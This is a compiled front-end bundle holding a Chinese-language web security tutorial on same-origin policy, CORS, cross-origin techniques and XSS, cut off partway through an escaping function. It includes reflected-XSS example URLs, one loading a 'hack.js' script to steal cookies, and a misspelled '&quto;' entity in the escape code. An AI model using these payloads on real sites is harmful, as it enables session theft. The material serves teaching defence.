(window.webpackJsonp=window.webpackJsonp||[]).push([[27],{396:function(t,s,a){"use strict";a.r(s);var e=a(42),r=Object(e.a)({},(function(){var t=this,s=t.$createElement,a=t._self._c||s;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"浏览器安全问题"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#浏览器安全问题"}},[t._v("#")]),t._v(" 浏览器安全问题")]),t._v(" "),a("h2",{attrs:{id:"思维脑图"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#思维脑图"}},[t._v("#")]),t._v(" 思维脑图")]),t._v(" "),a("img",{attrs:{src:"https://i.loli.net/2021/03/02/faoGW9DUezJZhA1.png",alt:"web安全"}}),t._v(" "),a("h2",{attrs:{id:"同源策略"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#同源策略"}},[t._v("#")]),t._v(" 同源策略")]),t._v(" "),a("p",[t._v("跨域，是指浏览器不能执行其他网站的脚本。它是由浏览器的同源策略造成的，是浏览器对 JavaScript 实施的安全限制。")]),t._v(" "),a("p",[t._v("所谓的同源是指，"),a("strong",[t._v("域名、协议、端口")]),t._v("均为相同。")]),t._v(" "),a("p",[t._v("同源策略限制了以下行为：")]),t._v(" "),a("ul",[a("li",[t._v("Cookie、LocalStorage 和 IndexDB 无法读取")]),t._v(" "),a("li",[t._v("DOM 和 JS 对象无法获取")]),t._v(" "),a("li",[t._v("Ajax 请求发送不出去")])]),t._v(" "),a("table",[a("thead",[a("tr",[a("th",{staticStyle:{"text-align":"left"}},[t._v("URL")]),t._v(" "),a("th",{staticStyle:{"text-align":"left"}},[t._v("结果")]),t._v(" "),a("th",{staticStyle:{"text-align":"left"}},[t._v("原因")])])]),t._v(" "),a("tbody",[a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("code",[t._v("http://store.company.com/dir2/other.html")])]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("同源")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("只有路径不同")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("code",[t._v("http://store.company.com/dir/inner/another.html")])]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("同源")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("只有路径不同")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("code",[t._v("https://store.company.com/secure.html")])]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("失败")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("协议不同")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("code",[t._v("http://store.company.com:81/dir/etc.html")])]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("失败")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("端口不同 ( "),a("code",[t._v("http://")]),t._v(" 默认端口是 80)")])]),t._v(" "),a("tr",[a("td",{staticStyle:{"text-align":"left"}},[a("code",[t._v("http://news.company.com/dir/other.html")])]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("失败")]),t._v(" "),a("td",{staticStyle:{"text-align":"left"}},[t._v("主机不同")])])])]),t._v(" "),a("h3",{attrs:{id:"cors标准"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cors标准"}},[t._v("#")]),t._v(" "),a("strong",[t._v("CORS")]),t._v("标准")]),t._v(" "),a("p",[a("strong",[t._v('CORS 是一个 W3C 标准，全称是"跨域资源共享"（Cross-origin resource sharing）。')])]),t._v(" "),a("p",[t._v("它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制。")]),t._v(" "),a("p",[t._v("浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。")]),t._v(" "),a("p",[t._v("因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。")]),t._v(" "),a("p",[t._v("分为两种请求，一种是简单请求，另一种是非简单请求。只要满足下面条件就是简单请求")]),t._v(" "),a("ul",[a("li",[t._v("请求方式为 HEAD、POST 或者 GET")]),t._v(" "),a("li",[t._v("http 头信息不超出一下字段：Accept、Accept-Language 、 Content-Language、 Last-Event-ID、 Content-Type(限于三个值：application/x-www-form-urlencoded、multipart/form-data、text/plain)")])]),t._v(" "),a("p",[t._v("如果 Origin 指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。")]),t._v(" "),a("div",{staticClass:"language-http extra-class"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[t._v("   Access-Control-Allow-Origin: http://api.bob.com\n   Access-Control-Allow-Credentials:true\n   Access-Control-Expose-Headers: FooBar\n   Content-Type: text/html; charset=utf-8\n")])])]),a("p",[t._v("上面的头信息之中，有三个与 CORS 请求相关的字段，都以 Access-Control-开头")]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("Access-Control-Allow-Origin")]),t._v(" :该字段是必须的。它的值要么是请求时 Origin 字段的值，要么是一个*，表示接受任意域名的请求")]),t._v(" "),a("li",[a("strong",[t._v("Access-Control-Allow-Credentials")]),t._v(": 该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为 true，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器。这个值也只能设为 true，如果服务器不要浏览器发送 Cookie，删除该字段即可。")]),t._v(" "),a("li",[a("strong",[t._v("Access-Control-Expose-Headers")]),t._v(":该字段可选。CORS 请求时，XMLHttpRequest 对象的 getResponseHeader()方法只能拿到 6 个基本字段："),a("strong",[t._v("Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma")]),t._v("。如果想拿到其他字段，就必须在 Access-Control-Expose-Headers 里面指定。")])]),t._v(" "),a("h4",{attrs:{id:"withcredentials-属性"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#withcredentials-属性"}},[t._v("#")]),t._v(" withCredentials 属性")]),t._v(" "),a("h5",{attrs:{id:"允许服务器读写-cookie"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#允许服务器读写-cookie"}},[t._v("#")]),t._v(" 允许服务器读写 cookie")]),t._v(" "),a("p",[t._v("需要注意的是，如果要发送 Cookie，Access-Control-Allow-Origin 就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的 document.cookie 也无法读取服务器域名下的 Cookie。")]),t._v(" "),a("h5",{attrs:{id:"非简单请求"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#非简单请求"}},[t._v("#")]),t._v(" 非简单请求")]),t._v(" "),a("p",[t._v("非简单请求是那种对服务器有特殊要求的请求，比如请求方法是 PUT 或 DELETE，或者 Content-Type 字段的类型是"),a("strong",[t._v("application/json")]),t._v("。")]),t._v(" "),a("p",[a("strong",[t._v('非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为"预检"请求（preflight）。')])]),t._v(" "),a("div",{staticClass:"language-http extra-class"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token request-line"}},[a("span",{pre:!0,attrs:{class:"token property"}},[t._v("OPTIONS")]),t._v(" /cors HTTP/1.1")]),t._v("\n   Origin: http://api.bob.com  //关键字段是Origin，表示请求来自哪个源。\n   Access-Control-Request-Method: PUT\n   Access-Control-Request-Headers: X-Custom-Header\n   Host: api.alice.com\n   Accept-Language: en-US\n   Connection: keep-alive\n   User-Agent: Mozilla/5.0...\n")])])]),a("p",[t._v('除了 Origin 字段，"预检"请求的头信息包括两个特殊字段。')]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("Access-Control-Request-Method")]),t._v("：该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 PUT。")]),t._v(" "),a("li",[a("strong",[t._v("Access-Control-Request-Headers")]),t._v("：该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 X-Custom-Header")])]),t._v(" "),a("p",[t._v('服务器收到"预检"请求以后，检查了'),a("code",[t._v("Origin")]),t._v("、"),a("code",[t._v("Access-Control-Request-Method")]),t._v("和"),a("code",[t._v("Access-Control-Request-Headers")]),t._v("字段以后，确认允许跨源请求，就可以做出回应")]),t._v(" "),a("div",{staticClass:"language-http extra-class"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Access-Control-Allow-Methods:")]),t._v(" GET, POST, PUT\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Access-Control-Allow-Headers:")]),t._v(" X-Custom-Header\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Access-Control-Allow-Credentials:")]),t._v(" true\n"),a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Access-Control-Max-Age:")]),t._v(" 1728000\n")])])]),a("ul",[a("li",[a("strong",[t._v("Access-Control-Allow-Methods")]),t._v('：该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次"预检"请求。')]),t._v(" "),a("li",[a("strong",[t._v("Access-Control-Allow-Headers")]),t._v('：如果浏览器请求包括 Access-Control-Request-Headers 字段，则 Access-Control-Allow-Headers 字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在"预检"中请求的字段。')]),t._v(" "),a("li",[a("strong",[t._v("Access-Control-Allow-Credentials")]),t._v("：该字段与简单请求时的含义相同。")]),t._v(" "),a("li",[a("strong",[t._v("Access-Control-Max-Age")]),t._v("：该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。")])]),t._v(" "),a("p",[t._v('一旦服务器通过了"预检"请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 Origin 头信息字段。服务器的回应，也都会有一个'),a("code",[t._v("Access-Control-Allow-Origin")]),t._v("头信息字段。")]),t._v(" "),a("p",[a("strong",[t._v("CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。JSONP 只支持 GET 请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。")])]),t._v(" "),a("h3",{attrs:{id:"跨域的解决办法"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#跨域的解决办法"}},[t._v("#")]),t._v(" 跨域的解决办法")]),t._v(" "),a("h4",{attrs:{id:"jsonp"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#jsonp"}},[t._v("#")]),t._v(" "),a("strong",[t._v("jsonp")])]),t._v(" "),a("p",[t._v("jsonp 跨域其实也是 JavaScript 设计模式中的一种代理模式。**在 html 页面中通过相应的标签从不同域名下加载静态资源文件是被浏览器允许的，**所以我们可以通过这个“犯罪漏洞”来进行跨域。一般，我们可以动态的创建 script 标签，再去请求一个带参网址来实现跨域通信")]),t._v(" "),a("p",[t._v("虽然这种方式非常好用，但是一个最大的缺陷是，只能够实现 get 请求")]),t._v(" "),a("div",{staticClass:"language-JavaScript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// create script")]),t._v("\nscript "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("createElement")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"script"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\nscript"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("src "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\ntarget"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("parentNode"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("insertBefore")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" target"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),a("h4",{attrs:{id:"cors"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cors"}},[t._v("#")]),t._v(" CORS")]),t._v(" "),a("p",[t._v("后端配置 CORS 允许跨域即可")]),t._v(" "),a("h4",{attrs:{id:"nginx-反向代理跨域"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#nginx-反向代理跨域"}},[t._v("#")]),t._v(" nginx 反向代理跨域")]),t._v(" "),a("h4",{attrs:{id:"node-代理跨域"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#node-代理跨域"}},[t._v("#")]),t._v(" node 代理跨域")]),t._v(" "),a("p",[t._v("node 中间件实现跨域代理，是通过启一个代理服务器，实现数据的转发，也可以通过设置 cookieDomainRewrite 参数修改响应头中 cookie 中域名，实现当前域的 cookie 写入，方便接口登录认证。")]),t._v(" "),a("h4",{attrs:{id:"iframe-跨域"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#iframe-跨域"}},[t._v("#")]),t._v(" "),a("strong",[t._v("iframe 跨域")])]),t._v(" "),a("div",{staticClass:"language-JavaScript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[t._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("domain "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" iframe 跨域\nwindow"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("name "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" iframe 跨域"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("//window.names属性值在文档刷新后依然存在的能力")]),t._v("\nlocation"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("hash "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" iframe 跨域\n")])])]),a("h4",{attrs:{id:"postmessage-跨域"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#postmessage-跨域"}},[t._v("#")]),t._v(" "),a("strong",[t._v("postMessage 跨域")])]),t._v(" "),a("p",[t._v("HTML5 全新的 API")]),t._v(" "),a("p",[t._v("允许跨窗口通信，不论这两个窗口是否同源。")]),t._v(" "),a("h4",{attrs:{id:"websocket-协议跨域"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#websocket-协议跨域"}},[t._v("#")]),t._v(" WebSocket 协议跨域")]),t._v(" "),a("p",[t._v("WebSocket 是 HTML5 开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。")]),t._v(" "),a("p",[t._v("webSocket 本身不存在跨域问题，所以我们可以利用 webSocket 来进行非同源之间的通信。")]),t._v(" "),a("h4",{attrs:{id:"修改快捷方式"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#修改快捷方式"}},[t._v("#")]),t._v(" 修改快捷方式")]),t._v(" "),a("p",[t._v("谷歌浏览器 快捷方式添加 --args --disable-web-security --user-data-dir")]),t._v(" "),a("p",[t._v("下面的那几种跨域看看就好了,平时主要使用的还是"),a("strong",[t._v("CORS")]),t._v("、"),a("strong",[t._v("JSONP")]),t._v("和"),a("strong",[t._v("代理")])]),t._v(" "),a("h3",{attrs:{id:"cookie-遵守同源策略吗"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#cookie-遵守同源策略吗"}},[t._v("#")]),t._v(" "),a("strong",[t._v("Cookie 遵守同源策略吗？")])]),t._v(" "),a("p",[t._v("也有，不过跟 AJAX 的同源策略稍微有些不同：")]),t._v(" "),a("ul",[a("li",[t._v("当请求 "),a("a",{attrs:{href:"https://link.zhihu.com/?target=http%3A//qq.com/",target:"_blank",rel:"noopener noreferrer"}},[t._v("qq.com"),a("OutboundLink")],1),t._v(" 下的资源时，浏览器会默认带上 "),a("a",{attrs:{href:"https://link.zhihu.com/?target=http%3A//qq.com/",target:"_blank",rel:"noopener noreferrer"}},[t._v("qq.com"),a("OutboundLink")],1),t._v(" 对应的 Cookie，不会带上"),a("a",{attrs:{href:"https://link.zhihu.com/?target=http%3A//baidu.com/",target:"_blank",rel:"noopener noreferrer"}},[t._v("baidu.com"),a("OutboundLink")],1),t._v(" 对应的 Cookie")]),t._v(" "),a("li",[t._v("当请求 "),a("a",{attrs:{href:"https://link.zhihu.com/?target=http%3A//v.qq.com/",target:"_blank",rel:"noopener noreferrer"}},[t._v("v.qq.com"),a("OutboundLink")],1),t._v(" 下的资源时，浏览器不仅会带上 "),a("a",{attrs:{href:"https://link.zhihu.com/?target=http%3A//v.qq.com/",target:"_blank",rel:"noopener noreferrer"}},[t._v("v.qq.com"),a("OutboundLink")],1),t._v(" 的 Cookie，还会带上 "),a("a",{attrs:{href:"https://link.zhihu.com/?target=http%3A//qq.com/",target:"_blank",rel:"noopener noreferrer"}},[t._v("qq.com"),a("OutboundLink")],1),t._v(" 的 Cookie")])]),t._v(" "),a("h2",{attrs:{id:"xss-攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#xss-攻击"}},[t._v("#")]),t._v(" XSS 攻击")]),t._v(" "),a("p",[t._v("XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。\n如果页面被注入了恶意 JavaScript 脚本，恶意脚本都能做哪些事情。")]),t._v(" "),a("ul",[a("li",[a("strong",[t._v("可以窃取 Cookie 信息")]),t._v("。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。")]),t._v(" "),a("li",[a("strong",[t._v("可以监听用户行为")]),t._v("。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。")]),t._v(" "),a("li",[t._v("可以通过修改 DOM 伪造假的登录窗口，用来"),a("strong",[t._v("欺骗用户输入用户名和密码等信息")]),t._v("。")]),t._v(" "),a("li",[t._v("还可以在页面内"),a("strong",[t._v("生成浮窗广告")]),t._v("，这些广告会严重地影响用户体验。")])]),t._v(" "),a("h3",{attrs:{id:"恶意脚本是怎么注入的"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#恶意脚本是怎么注入的"}},[t._v("#")]),t._v(" 恶意脚本是怎么注入的")]),t._v(" "),a("h4",{attrs:{id:"存储型-xss-攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#存储型-xss-攻击"}},[t._v("#")]),t._v(" "),a("strong",[t._v("存储型 XSS 攻击")])]),t._v(" "),a("p",[t._v("黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；")]),t._v(" "),a("h4",{attrs:{id:"反射型-xss-攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#反射型-xss-攻击"}},[t._v("#")]),t._v(" "),a("strong",[t._v("反射型 XSS 攻击")])]),t._v(" "),a("p",[t._v("在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户")]),t._v(" "),a("div",{staticClass:"language-JavaScript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 普通")]),t._v("\nhttp"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("localhost"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3000")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v("china\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// alert尝试")]),t._v("\nhttp"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("localhost"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3000")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 获取Cookie")]),t._v("\nhttp"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("localhost"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("3000")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("script src"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"http://localhost:4000/hack.js"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// 短域名伪造 https://dwz.cn/")]),t._v("\n")])])]),a("h4",{attrs:{id:"基于-dom-的-xss-攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#基于-dom-的-xss-攻击"}},[t._v("#")]),t._v(" "),a("strong",[t._v("基于 DOM 的 XSS 攻击")])]),t._v(" "),a("p",[t._v("具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。")]),t._v(" "),a("h3",{attrs:{id:"如何阻止-xss-攻击"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#如何阻止-xss-攻击"}},[t._v("#")]),t._v(" 如何阻止 XSS 攻击")]),t._v(" "),a("ol",[a("li",[a("p",[a("strong",[t._v("服务器对输入脚本进行过滤或转码")])]),t._v(" "),a("ul",[a("li",[t._v("黑名单")])]),t._v(" "),a("div",{staticClass:"language-JavaScript extra-class"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("function")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("escape")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token parameter"}},[t._v("str")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v("&")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&amp;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v("<")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&lt;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v(">")]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&gt;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-source language-regex"}},[t._v('"')]),a("span",{pre:!0,attrs:{class:"token regex-delimiter"}},[t._v("/")]),a("span",{pre:!0,attrs:{class:"token regex-flags"}},[t._v("g")])]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"&quto;"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n  str "),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" str"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("replace")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),a("span",{pre:!0,attrs:{class:"token regex"}},[a("span",{pre:!0,attrs:{class:"token 